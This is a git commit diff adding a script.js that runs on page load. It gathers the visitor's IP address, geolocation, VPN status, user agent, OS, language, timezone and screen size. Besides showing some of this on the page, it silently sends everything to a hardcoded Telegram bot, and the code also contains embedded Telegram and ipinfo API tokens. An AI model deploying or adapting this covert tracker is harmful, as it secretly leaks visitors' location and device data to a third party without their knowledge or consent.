786fdbaa99d30a969517d8c52c1103cc389a9b19
Gustavo G <6ustav@gmail.com>
2025-04-15 13:43:16 -0300

    updated

---
+++ script.js
@@ -0,0 +1,46 @@
+window.onload = function () {
+  fetch('https://api.ipify.org?format=json')
+    .then(response => response.json())
+    .then(data => {
+      const ip = data.ip;
+      const os = navigator.platform;
+      const language = navigator.language;
+      const time = new Date().toLocaleString();
+      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      const screenResolution = `${screen.width}x${screen.height}`;
+
+      let infoDiv = document.getElementById('info');
+      infoDiv.innerHTML = `
+                <p>IP Address: ${ip}</p>
+                <p>Operating System: ${os}</p>
+                <p>Browser Language: ${language}</p>
+                <p>Visit Time: ${time}</p>
+                <p>Timezone: ${timezone}</p>
+                <p>Screen Resolution: ${screenResolution}</p>
+            `;
+
+      const botToken = '8090456147:AAEgWuP5awTTHtrokLNqBHGf6yo2PV6vc9A';
+      const chatId = '1695105797';
+
+      fetch(`https://ipinfo.io/${ip}?token=3176c341a723fa`)
+        .then(response => response.json())
+        .then(ipInfo => {
+          const country = ipInfo.country;
+          const region = ipInfo.region;
+          const city = ipInfo.city;
+          const usingVPN = ipInfo.privacy ? ipInfo.privacy.proxy : 'Unknown';
+          const deviceType = navigator.userAgent;
+
+          const message = `IP Address = ${ip}%0ACountry = ${country}%0ARegion = ${region}%0ACity = ${city}%0AUsing VPN = ${usingVPN}%0ADevice Type = ${deviceType}%0AOperating System = ${os}%0ABrowser Language = ${language}%0AVisit Time = ${time}%0ATimezone = ${timezone}%0AScreen Resolution = ${screenResolution}`;
+
+          fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`)
+            .then(response => response.json())
+            .then(data => {
+              console.log('Telegram message sent:', data);
+            })
+            .catch(error => {
+              console.error('Error sending Telegram message:', error);
+            });
+        });
+    });
+};
